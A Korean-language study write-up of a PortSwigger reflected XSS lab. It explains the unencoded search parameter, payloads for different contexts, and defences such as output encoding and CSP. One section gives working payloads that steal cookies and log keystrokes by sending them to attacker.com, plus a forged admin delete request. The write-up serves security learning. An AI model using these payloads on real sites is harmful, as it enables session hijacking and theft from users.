# Lab: Reflected XSS into HTML context with nothing encoded

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — Reflected
- **링크**: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

## 목표

검색 기능에 Reflected XSS 취약점을 이용하여 `alert()` 함수를 실행시킨다.

## 취약점 위치

검색 폼의 `search` 파라미터. 입력값이 HTML 인코딩 없이 응답 페이지에 그대로 반영된다.

```
GET /?search=hello

→ 응답 HTML:
<h1>1 search results for 'hello'</h1>
```

## 공격 방법

검색창에 `<script>` 태그를 직접 입력한다.

```html
<script>alert('1')</script>
```

서버가 이 입력을 HTML 인코딩하지 않고 페이지에 그대로 출력하기 때문에 브라우저가 스크립트로 해석하여 실행한다.

```
GET /?search=<script>alert('1')</script>

→ 응답 HTML:
<h1>1 search results for '<script>alert('1')</script>'</h1>
```

브라우저가 이 HTML을 파싱하는 순간 `<script>` 블록이 실행된다.

## Reflected XSS 동작 원리

```
공격자: 악성 URL 생성
         ↓
피해자: 링크 클릭 → GET 요청 전송
         ↓
서버:  입력값을 그대로 HTML에 삽입하여 응답
         ↓
피해자 브라우저: HTML 파싱 중 <script> 실행
         ↓
공격 성공 (쿠키 탈취, 세션 하이재킹 등)
```

서버에 페이로드가 저장되지 않고 **요청→응답 사이클에서만 반사**되기 때문에 Reflected(반사형)라고 부른다.

## Stored XSS와의 차이

| 항목 | Reflected XSS | Stored XSS |
|------|--------------|------------|
| 페이로드 위치 | URL 파라미터 (서버 미저장) | DB 등 서버에 저장 |
| 공격 대상 | 악성 링크를 클릭한 사용자 | 해당 페이지를 방문하는 모든 사용자 |
| 지속성 | 요청마다 전달 필요 | 한 번 삽입 후 지속 |
| 위험도 | 중간 | 높음 |

## 핵심 정리

- 사용자 입력이 HTML 인코딩 없이 응답에 포함되면 Reflected XSS가 성립한다.
- 브라우저는 서버 응답을 신뢰하기 때문에, 응답 안에 `<script>`가 있으면 무조건 실행한다.
- 실제 공격에서는 `alert()` 대신 쿠키 탈취(`document.cookie`), 키로거, 피싱 페이지 리다이렉트 등이 사용된다.
- **방어**: 출력 시 HTML 인코딩(`<` → `&lt;`, `>` → `&gt;`), CSP(Content-Security-Policy) 헤더 설정.

## 배운 점 및 추가 학습

### 1. XSS의 세 가지 유형

| 유형 | 설명 | 예시 |
|------|------|------|
| **Reflected** | 입력이 즉시 응답에 반사 | 검색어, 에러 메시지 |
| **Stored** | 입력이 서버에 저장 후 출력 | 댓글, 프로필 |
| **DOM-based** | 서버 거치지 않고 JS가 DOM 조작 | `document.URL`, `location.hash` |

### 2. XSS 컨텍스트의 중요성

페이로드가 삽입되는 HTML 컨텍스트에 따라 공격 방법이 달라진다.

| 컨텍스트 | 삽입 위치 | 페이로드 예시 |
|----------|-----------|--------------|
| HTML 태그 사이 | `<p>입력값</p>` | `<script>alert(1)</script>` |
| 태그 속성 | `<input value="입력값">` | `" onmouseover="alert(1)` |
| JavaScript 내부 | `var x = '입력값';` | `'; alert(1);//` |
| URL | `<a href="입력값">` | `javascript:alert(1)` |

이번 랩은 가장 기본적인 케이스 — HTML 태그 사이에 인코딩 없이 반사되는 환경이다.

### 3. 실제 공격 페이로드 예시

```javascript
// 쿠키 탈취 (세션 하이재킹)
<script>document.location='https://attacker.com/?c='+document.cookie</script>

// 키로거
<script>document.addEventListener('keypress', e => fetch('https://attacker.com/?k='+e.key))</script>

// 다른 사용자로 요청 전송 (CSRF 조합)
<script>fetch('/admin/delete-user', {method:'POST', body:'user=victim'})</script>
```

### 4. Content-Security-Policy (CSP) 방어

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

외부 스크립트와 인라인 `<script>` 태그를 차단하여 XSS 피해를 줄인다. 단, CSP도 우회 기법이 존재하므로 출력 인코딩과 함께 사용해야 한다.
